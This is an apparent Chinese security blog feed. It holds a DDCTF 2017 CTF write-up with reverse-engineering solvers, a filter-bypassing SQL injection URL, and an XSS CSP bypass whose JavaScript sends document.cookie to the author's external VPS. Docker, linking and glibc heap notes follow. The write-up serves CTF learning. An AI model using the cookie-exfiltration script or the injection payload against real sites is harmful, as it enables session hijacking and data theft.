information_schema.columns <span class="keyword">where</span> table_name=表名的十六进制编码 <span class="keyword">and</span> table_schema=数据库的<span class="number">16</span>进制编码</div></pre></td></tr></table></figure>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.waitalone.cn/mysql-injection-summary.html" target="_blank" rel="external">https://www.waitalone.cn/mysql-injection-summary.html</a></p>
<h3 id="盲注还是虚得很"><a href="#盲注还是虚得很" class="headerlink" title="盲注还是虚得很"></a>盲注还是虚得很</h3>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[DDCTF]]></title>
      <url>/2017/05/18/DDCTF/</url>
      <content type="html"><![CDATA[<h2 id="第一题-RE"><a href="#第一题-RE" class="headerlink" title="第一题[RE]"></a>第一题[RE]</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">    <span class="keyword">char</span> arr[<span class="number">100</span>];</div><div class="line">    FILE * foutput = fopen(<span class="string">"./data"</span>, <span class="string">"rb"</span>);</div><div class="line">    <span class="keyword">while</span> (fread(&amp;arr[j], <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">1</span>, foutput)) &#123;</div><div class="line">        ++j;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// (0000000100000CB0 - 0000000100000C90) &gt;&gt; 2 = 8</span></div><div class="line">    <span class="keyword">int</span> v2 = <span class="number">8</span> ^ arr[<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">55</span>; i++) &#123;</div><div class="line">        arr[i] -= <span class="number">2</span>;</div><div class="line">        arr[i] ^= v2;</div><div class="line">        v2++;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, &amp;arr[<span class="number">1</span>]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// DDCTF-5943293119a845e9bbdbde5a369c1f50@didichuxing.com</span></div></pre></td></tr></table></figure>
<h2 id="第二题-apk"><a href="#第二题-apk" class="headerlink" title="第二题[apk]"></a>第二题[apk]</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">d2</span> </span>&#123; </div><div class="line"></div><div class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] p = &#123; -<span class="number">40</span>, -<span class="number">62</span>, <span class="number">107</span>, <span class="number">66</span>, -<span class="number">126</span>, <span class="number">103</span>, -<span class="number">56</span>, <span class="number">77</span>, <span class="number">122</span>, -<span class="number">107</span>, -<span class="number">24</span>, -<span class="number">127</span>, <span class="number">72</span>, -<span class="number">63</span>, -<span class="number">98</span>, <span class="number">64</span>, -<span class="number">24</span>, -<span class="number">5</span>, -<span class="number">49</span>, -<span class="number">26</span>, <span class="number">79</span>, -<span class="number">70</span>, -<span class="number">26</span>, -<span class="number">81</span>, <span class="number">120</span>, <span class="number">25</span>, <span class="number">111</span>, -<span class="number">100</span>, -<span class="number">23</span>, -<span class="number">9</span>, <span class="number">122</span>, -<span class="number">35</span>, <span class="number">66</span>, -<span class="number">50</span>, -<span class="number">116</span>, <span class="number">3</span>, -<span class="number">72</span>, <span class="number">102</span>, -<span class="number">45</span>, -<span class="number">85</span>, <span class="number">0</span>, <span class="number">126</span>, -<span class="number">34</span>, <span class="number">62</span>, <span class="number">83</span>, -<span class="number">34</span>, <span class="number">48</span>, -<span class="number">111</span>, <span class="number">61</span>, -<span class="number">9</span>, -<span class="number">51</span>, <span class="number">114</span>, <span class="number">20</span>, <span class="number">81</span>, -<span class="number">126</span>, -<span class="number">18</span>, <span class="number">27</span>, -<span class="number">115</span>, -<span class="number">76</span>, -<span class="number">116</span>, -<span class="number">48</span>, -<span class="number">118</span>, -<span class="number">10</span>, -<span class="number">102</span>, -<span class="number">106</span>, <span class="number">113</span>, -<span class="number">104</span>, <span class="number">98</span>, -<span class="number">109</span>, <span class="number">74</span>, <span class="number">48</span>, <span class="number">47</span>, -<span class="number">100</span>, -<span class="number">88</span>, <span class="number">121</span>, <span class="number">22</span>, -<span class="number">63</span>, -<span class="number">32</span>, -<span class="number">20</span>, -<span class="number">41</span>, -<span class="number">27</span>, -<span class="number">20</span>, -<span class="number">118</span>, <span class="number">100</span>, -<span class="number">76</span>, <span class="number">70</span>, -<span class="number">49</span>, -<span class="number">39</span>, -<span class="number">27</span>, -<span class="number">106</span>, -<span class="number">13</span>, -<span class="number">108</span>, <span class="number">115</span>, -<span class="number">87</span>, -<span class="number">1</span>, -<span class="number">22</span>, -<span class="number">53</span>, <span class="number">21</span>, -<span class="number">100</span>, <span class="number">124</span>, -<span class="number">95</span>, -<span class="number">40</span>, <span class="number">62</span>, -<span class="number">69</span>, <span class="number">29</span>, <span class="number">56</span>, -<span class="number">53</span>, <span class="number">85</span>, -<span class="number">48</span>, <span class="number">25</span>, <span class="number">37</span>, -<span class="number">78</span>, <span class="number">11</span>, -<span class="number">110</span>, -<span class="number">24</span>, -<span class="number">120</span>, -<span class="number">82</span>, <span class="number">6</span>, -<span class="number">94</span>, -<span class="number">101</span> &#125;;</div><div class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] q = &#123; -<span class="number">57</span>, -<span class="number">90</span>, <span class="number">53</span>, -<span class="number">71</span>, -<span class="number">117</span>, <span class="number">98</span>, <span class="number">62</span>, <span class="number">98</span>, <span class="number">101</span>, -<span class="number">96</span>, <span class="number">36</span>, <span class="number">110</span>, <span class="number">77</span>, -<span class="number">83</span>, -<span class="number">121</span>, <span class="number">2</span>, -<span class="number">48</span>, <span class="number">94</span>, -<span class="number">106</span>, -<span class="number">56</span>, -<span class="number">49</span>, -<span class="number">80</span>, -<span class="number">1</span>, <span class="number">83</span>, <span class="number">75</span>, <span class="number">66</span>, -<span class="number">44</span>, <span class="number">74</span>, <span class="number">2</span>, -<span class="number">36</span>, -<span class="number">42</span>, -<span class="number">103</span>, <span class="number">6</span>, -<span class="number">115</span>, -<span class="number">40</span>, <span class="number">69</span>, -<span class="number">107</span>, <span class="number">7</span>, -<span class="number">32</span>, -<span class="number">55</span>, <span class="number">56</span>, <span class="number">29</span>, -<span class="number">18</span>, <span class="number">92</span>, <span class="number">106</span>, -<span class="number">70</span>, <span class="number">82</span>, -<span class="number">12</span>, <span class="number">4</span>, -<span class="number">61</span>, -<span class="number">85</span>, <span class="number">19</span>, <span class="number">34</span>, <span class="number">51</span>, -<span class="number">26</span>, -<span class="number">34</span>, <span class="number">126</span>, -<span class="number">75</span>, -<span class="number">42</span>, -<span class="number">22</span>, -<span class="number">79</span>, -<span class="number">77</span>, -<span class="number">61</span>, -<span class="number">84</span>, -<span class="number">92</span>, <span class="number">65</span>, -<span class="number">81</span>, <span class="number">87</span>, -<span class="number">94</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">70</span>, -<span class="number">8</span>, -<span class="number">63</span>, <span class="number">26</span>, <span class="number">126</span>, -<span class="number">76</span>, -<span class="number">104</span>, -<span class="number">123</span>, -<span class="number">71</span>, -<span class="number">126</span>, -<span class="number">62</span>, -<span class="number">23</span>, <span class="number">11</span>, -<span class="number">39</span>, <span class="number">70</span>, <span class="number">14</span>, <span class="number">59</span>, -<span class="number">101</span>, -<span class="number">39</span>, -<span class="number">124</span>, <span class="number">91</span>, -<span class="number">109</span>, <span class="number">102</span>, -<span class="number">49</span>, <span class="number">21</span>, <span class="number">105</span>, <span class="number">0</span>, <span class="number">37</span>, -<span class="number">128</span>, -<span class="number">57</span>, <span class="number">117</span>, <span class="number">110</span>, -<span class="number">115</span>, -<span class="number">86</span>, <span class="number">56</span>, <span class="number">25</span>, -<span class="number">46</span>, -<span class="number">55</span>, <span class="number">7</span>, -<span class="number">125</span>, <span class="number">109</span>, <span class="number">76</span>, <span class="number">104</span>, -<span class="number">15</span>, <span class="number">82</span>, -<span class="number">53</span>, <span class="number">18</span>, -<span class="number">28</span>, -<span class="number">24</span> &#125;;</div><div class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">i</span><span class="params">()</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">    <span class="keyword">byte</span>[] arrayOfByte1 = <span class="keyword">new</span> <span class="keyword">byte</span>[p.length];</div><div class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> (i &lt; arrayOfByte1.length)</div><div class="line">    &#123;</div><div class="line">      arrayOfByte1[i] = ((<span class="keyword">byte</span>)(p[i] ^ q[i]));</div><div class="line">      i += <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> k = arrayOfByte1[<span class="number">0</span>];</div><div class="line">    i = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> (arrayOfByte1[(k + i)] != <span class="number">0</span>) &#123;</div><div class="line">      i += <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">byte</span>[] arrayOfByte2 = <span class="keyword">new</span> <span class="keyword">byte</span>[i];</div><div class="line">    <span class="keyword">while</span> (j &lt; i)</div><div class="line">    &#123;</div><div class="line">      arrayOfByte2[j] = arrayOfByte1[(k + j)];</div><div class="line">      j += <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> String(arrayOfByte2);</div><div class="line">  &#125;</div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123; </div><div class="line">       System.out.println(i());</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>flag:<br>DDCTF-a3b8c0b9dbe94fa6bd0e8bfa95620751@didichuxing.com</p>
<h2 id="第三题-RE"><a href="#第三题-RE" class="headerlink" title="第三题[RE]"></a>第三题[RE]</h2><p>不会做，好像是要脱壳</p>
<h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题[???]"></a>第四题[???]</h2><p>传说中有钱人才能做得MAC题目</p>
<h2 id="第五题-WEB-sqli"><a href="#第五题-WEB-sqli" class="headerlink" title="第五题[WEB,sqli]"></a>第五题[WEB,sqli]</h2><p>过滤了空格 =&gt; <code>%0a</code><br>过滤了逗号</p>
<pre><code>- limit处 =&gt; limit 1 offset 4
- union处 =&gt; union select * from (select 1)a join (select 2)b...
</code></pre><p>都是师傅教的然后自己构造了一下</p>
<p>payload:<br><a href="http://118.190.134.8/t1/news.php?id=7%0aunion%0aselect%0a*from%0a(select%0a1)a%0ajoin%0a(select%0a1)b%0ajoin%0a(select%0ai.4%0afrom%0a(select%0a*%0afrom%0a(select%0a1)e%0ajoin%0a(select%0a2)f%0ajoin%0a(select%0a3)g%0ajoin%0a(select%0a4)h%0aunion%0aselect%0a*%0afrom%0anews)i%0alimit%0a1%0aoffset%0a4)c%0ajoin%0a(select%0a1)d#" target="_blank" rel="external">http://118.190.134.8/t1/news.php?id=7%0aunion%0aselect%0a*from%0a(select%0a1)a%0ajoin%0a(select%0a1)b%0ajoin%0a(select%0ai.4%0afrom%0a(select%0a*%0afrom%0a(select%0a1)e%0ajoin%0a(select%0a2)f%0ajoin%0a(select%0a3)g%0ajoin%0a(select%0a4)h%0aunion%0aselect%0a*%0afrom%0anews)i%0alimit%0a1%0aoffset%0a4)c%0ajoin%0a(select%0a1)d#</a></p>
<p>flag:<br>flag{DDCTF-88458a95f96c4dfea359d1de2b03bbdb@didichuxing.com}</p>
<h2 id="几个资料不错"><a href="#几个资料不错" class="headerlink" title="几个资料不错"></a>几个资料不错</h2><p><a href="http://www.vuln.cn/6105" target="_blank" rel="external">http://www.vuln.cn/6105</a> (wooyun <a href="http://drops.wooyun.org/tips/7883" target="_blank" rel="external">http://drops.wooyun.org/tips/7883</a>)</p>
<h2 id="第七题-WEB-xss"><a href="#第七题-WEB-xss" class="headerlink" title="第七题[WEB,xss]"></a>第七题[WEB,xss]</h2><p>第一次做出来xss题目<br>这一题对xss没有任何过滤<br>但不能内联js，所以相当于利用上传</p>
<ol>
<li>先用link来bypass这个CSP<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">// <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"//45.78.56.153:8886/"</span>&gt;</span> <span class="comment">&lt;!--</span></div><div class="line"><span class="comment">var n0t = document.createElement("link");</span></div><div class="line"><span class="comment">n0t.setAttribute("rel", "prefetch");</span></div><div class="line"><span class="comment">n0t.setAttribute("href", "http://45.78.56.153:8886/" + document.cookie);</span></div><div class="line"><span class="comment">document.head.appendChild(n0t);</span></div><div class="line"><span class="comment">// --&gt;</span></div></pre></td></tr></table></figure>
</li>
</ol>
<p>在vps上收到了地址，等下作为脚本</p>
<ol>
<li>再次上传并且引入第一步里的脚本<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash=11b2054f2a3f28e43371b9008d66634d"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
</li>
</ol>
<p>获取tips<br><code>/hit=c2V0Y29va2llKCJmbGFnIiwgImZsYWd7eHh4eHh4eHh4eHh4eHh4eH0iLCB0aW1lKCkrMzYwMDAwMDAsICIvdDIvZjFhZ18xc19oM3IzIik7</code><br>base64一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">setcookie(<span class="string">"flag"</span>, <span class="string">"flag&#123;xxxxxxxxxxxxxxxx&#125;"</span>, time()+<span class="number">36000000</span>, <span class="string">"/t2/f1ag_1s_h3r3"</span>);</div></pre></td></tr></table></figure></p>
<ol>
<li>想要获取<code>/t2/f1ag_1s_h3r3</code>下的flag<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">// <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"//45.78.56.153:8886/"</span>&gt;</span> <span class="comment">&lt;!--</span></div><div class="line"><span class="comment">var kk = document.getElementById('kk');</span></div><div class="line"><span class="comment">kk.onload = function () &#123;</span></div><div class="line"><span class="comment">    var m = document.getElementById('kk').contentWindow;</span></div><div class="line"><span class="comment">    var n0t = document.createElement("link");</span></div><div class="line"><span class="comment">    n0t.setAttribute("rel", "prefetch");</span></div><div class="line"><span class="comment">    n0t.setAttribute("href", "http://45.78.56.153:8886/" + m.document.cookie);</span></div><div class="line"><span class="comment">    document.head.appendChild(n0t);</span></div><div class="line"><span class="comment">&#125;</span></div><div class="line"><span class="comment">// --&gt;</span></div></pre></td></tr></table></figure>
</li>
</ol>
<p>vps上返回地址<br><a href="http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash=b4bc243e8536536b0ff97e9d8acc7918" target="_blank" rel="external">http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash=b4bc243e8536536b0ff97e9d8acc7918</a></p>
<ol>
<li>这次引入一个iframe，通过第三步中的脚本来把cookie发到vps上<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash=b4bc243e8536536b0ff97e9d8acc7918"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://114.215.24.14/t2/f1ag_1s_h3r3"</span> <span class="attr">id</span>=<span class="string">"kk"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div></pre></td></tr></table></figure>
</li>
</ol>
<p>获得flag<br>flag{DDCTF-82b6ac5623b04c8f823d29fa73875c9c@didichuxing.com};</p>
]]></content>
      
        
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[docker笔记]]></title>
      <url>/2017/05/16/docker%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h3 id="起一个shell"><a href="#起一个shell" class="headerlink" title="起一个shell"></a>起一个shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">haibin$: sudo docker run -ti ubuntu:stack1  /bin/sh</div></pre></td></tr></table></figure>
<h3 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">haibin$: sudo docker images</div></pre></td></tr></table></figure>
<h3 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">haibin$: sudo docker ps -a</div></pre></td></tr></table></figure>
<p><code>contianer</code>和<code>images</code>是有很大不同的哦 (<a href="http://blog.csdn.net/chszs/article/details/48252799" target="_blank" rel="external">http://blog.csdn.net/chszs/article/details/48252799</a>)<br><code>-a</code>会显示所有的容器，不加<code>-a</code>只显示正在跑的<br>看起来好像是额，镜像是不可写的，相当于一块光盘镜像？然后容器可以更改？每次运行后的更改会写入容器的文件系统里<br>md虽然我还是不太懂，好忧伤啊</p>
<h3 id="从docker-container里拷贝libc文件出来"><a href="#从docker-container里拷贝libc文件出来" class="headerlink" title="从docker container里拷贝libc文件出来"></a>从docker container里拷贝libc文件出来</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">haibin$: sudo docker cp &lt;containerId&gt;:/lib32/libc.so.6 /host/path/target</div></pre></td></tr></table></figure>
<h3 id="检查特定容器"><a href="#检查特定容器" class="headerlink" title="检查特定容器"></a>检查特定容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker inspect contianerid</div></pre></td></tr></table></figure>
<h3 id="一般的run一个容器"><a href="#一般的run一个容器" class="headerlink" title="一般的run一个容器"></a>一般的run一个容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">haibin$: sudo docker run --name stack1 -it -d -P ubuntu:stack1</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-d 后台运行容器并返回容器ID</div><div class="line">-it 交互式shell(那他这个-d之后再用-it有事吗意义吗)[查了下说`sudo docker attach contianerid` 可以重新起shell]</div><div class="line">--name 起一个名字</div><div class="line">-P 相当于端口映射，docker会在host中随机从49153 和65535之间查找一个未被占用的端口绑定到container</div></pre></td></tr></table></figure>
<p>另外可以用<code>-p IP:host_port:container_port</code>指定端口映射规则(<a href="http://udn.yyuap.com/doc/docker_practice/advanced_network/port_mapping.html" target="_blank" rel="external">http://udn.yyuap.com/doc/docker_practice/advanced_network/port_mapping.html</a>)<br>然后发现个问题，我想做一些操作，把他attach出来，搞完后，我想把他退出去，然后我就<code>Ctrl+d</code>或者<code>exit</code>对吧<br>然后md，他就就退出去了，我的天哪<br>刚还发现:</p>
<blockquote>
<p>如果以单次执行方式运行容器，当命令执行完毕后容器就会自动停止。而使用交互的方式运行容器，则直到交互程序退出容器才会停止。<br>所以为了让他一直跑着，所以要<code>-it</code>，但不想看着他所以要丢到后台<code>-d</code>对吗<br>诶好像不是，这个<code>-d</code>是守护进程， </p>
</blockquote>
<p>查了下，可以酱紫</p>
<ol>
<li>在交互式容器中，先按<ctrl +="" p="">再按<ctrl +="" q="">，即可将容器切换到后台。这样子就能切回去了</ctrl></ctrl></li>
<li>还可以用<code>docker exec</code>来跑一个新的服务，或者起一个shell，用完把这个shell关掉就可以了</li>
</ol>
<h3 id="docker-exec"><a href="#docker-exec" class="headerlink" title="docker exec"></a>docker exec</h3><p>与docker run极为相似，也可以使用-i、-t和-d等参数<br>作用是为运行中的容器启动新进程<br>那就是说要先run一个，再有监控之类的需求的时候再exec一个进程</p>
<h3 id="镜像迁移"><a href="#镜像迁移" class="headerlink" title="镜像迁移"></a>镜像迁移</h3><p>备份<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">haibin$: docker save busybox-1 &gt; /home/save.tar</div></pre></td></tr></table></figure></p>
<p>恢复<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">haibin$: docker load &lt; /home/save.tar</div></pre></td></tr></table></figure></p>
<p>有一次ctf的时候有道题目就是提供了一个docker镜像还是什么来着。自己直接没做</p>
<h3 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">haibin$: docker build -t &lt;镜像名&gt; &lt;Dockerfile路径&gt;</div></pre></td></tr></table></figure>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.csdn.net/sch0120/article/category/6519600" target="_blank" rel="external">http://blog.csdn.net/sch0120/article/category/6519600</a><br>这个挺不错的，可以供参考的<br><a href="http://blog.csdn.net/chszs/article/details/48252799" target="_blank" rel="external">http://blog.csdn.net/chszs/article/details/48252799</a><br>这个还没细看<br><a href="http://blog.csdn.net/wsscy2004/article/details/25878363" target="_blank" rel="external">http://blog.csdn.net/wsscy2004/article/details/25878363</a><br>简单快速实用</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[动态链接]]></title>
      <url>/2017/05/16/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/</url>
      <content type="html"><![CDATA[<h2 id="阅读理解"><a href="#阅读理解" class="headerlink" title="阅读理解"></a>阅读理解</h2><p><a href="http://www.iecc.com/linker/linker10.html" target="_blank" rel="external">http://www.iecc.com/linker/linker10.html</a><br><a href="http://blog.csdn.net/giantpoplar/article/details/46485649" target="_blank" rel="external">http://blog.csdn.net/giantpoplar/article/details/46485649</a></p>
<h2 id="还在理解中…"><a href="#还在理解中…" class="headerlink" title="还在理解中…"></a>还在理解中…</h2><p>动态装入静态链接<br>静态装入动态链接<br>动态装入动态链接<br>静态装入静态链接</p>
<p>hhh~没懂，要买本程序员的自我修养了</p>
<p>好菜啊，I’m good vegetable</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[堆溢出]]></title>
      <url>/2017/05/16/%E5%A0%86%E6%BA%A2%E5%87%BA/</url>
      <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></div><div class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></div><div class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></div><div class="line"></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></div><div class="line"></div><div class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></div><div class="line"></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>未释放(分配)的堆块只使用<code>prev_size</code>和<code>size</code><br>已经释放的堆块还会使用<code>fd</code>和<code>bk</code>字段，作为<code>漏洞利用字段</code></p>
<p>所以我们可以画个图</p>
<blockquote>
<p>使用中的堆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">+-----+-----+</div><div class="line">|prev_size  |</div><div class="line">+-----------+</div><div class="line">|size    | p|</div><div class="line">+-----+-----+</div><div class="line">|chunk(data)|</div><div class="line">+-----+-----+</div></pre></td></tr></table></figure></p>
<p>free掉的堆</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">+--------+--------+</div><div class="line">|prev_size        |</div><div class="line">+-----------------+</div><div class="line">|size    |    p   |</div><div class="line">+--------+--------+</div><div class="line">|fd(next)|bk(prev)|</div><div class="line">+--------+--------+</div><div class="line">|chunk(data)      |</div><div class="line">+--------+--------+</div></pre></td></tr></table></figure>
<p>在glibc堆块中是8字节对齐的。为了简化内存的管理，堆块的大小总是8字节的倍数。这就表示size的最后3位可以是其他用途（正常情况下总是置0）。只有第一位对我们很重要(我们把后三位叫做p,那么这个很重要的就是p的最低位了)。如果这位置1，就表示前面的堆块在使用。如果没有置1，表示 <em>前面</em> 的堆块没有被使用。如果相关的内存被释放了，堆块就不会被使用（通过调用函数去释放）。</p>
<p>这个<br>注意是前面的堆块<br>所以要知道本堆块是否在使用，需要顺着指针找到下一堆块，看下一堆块size的标志位(不是prev_size)</p>
<p><code>prev_size</code> 表示前一个chunk的size, 那么可以使用这个值来找到前一个chunk的开始</p>
<blockquote>
<p>我有一个问题,这个前后是怎么分的…什么叫前,什么叫后</p>
</blockquote>
<p>当前堆块释放后，下一堆块的size字段关键位会被清零。此外，prev_size字段会被设置为堆块释放状态(但好像是当p=0,这个prev_size才有意义)</p>
<p>被释放的堆块通过<code>fd</code>和<code>bk</code>连入一个双向链表中(据说还是一个环形的，首尾相接的链表,是的,这个在<code>0day安全里看到了</code>)<br>大概长这个样子,这个表win下他叫空表[FreeList],0day安全里面这样子叫他(下面来自win)</p>
